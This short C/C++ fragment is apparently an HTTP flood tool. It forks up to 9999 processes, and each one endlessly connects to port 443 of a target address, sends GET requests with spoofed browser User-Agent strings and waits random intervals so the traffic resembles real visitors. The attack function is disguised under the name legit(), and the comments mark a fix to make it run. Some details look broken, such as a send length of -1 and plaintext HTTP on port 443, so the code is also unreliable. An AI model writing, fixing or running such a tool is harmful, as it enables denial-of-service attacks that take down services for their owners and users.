#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

const char* get_ip();   // ← important!

void legit() {
    const char* h[] = {
        "GET / HTTP/1.1\r\nHost: t\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129 Safari/537.36\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
        "GET /?r=1 HTTP/1.1\r\nHost: t\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
    };

    while(1) {
        int s = socket(2,1,0);
        sockaddr_in a{2, htons(443), inet_addr(get_ip())};
        if(connect(s,(sockaddr*)&a,16)<0){ close(s); usleep(10000); continue; }

        send(s, h[rand()&1], -1, 0);
        char buf[9999];
        while(recv(s,buf,9999,0)>0);
        close(s);
        usleep(30000 + rand()%70000);
    }
}

void start_legit() {          // ← THIS FUNCTION WAS MISSING!
    srand(time(0) ^ getpid());
    for(int i = 0; i < 9999; i++) {
        if(fork() == 0) {
            legit();
            exit(0);
        }
    }
}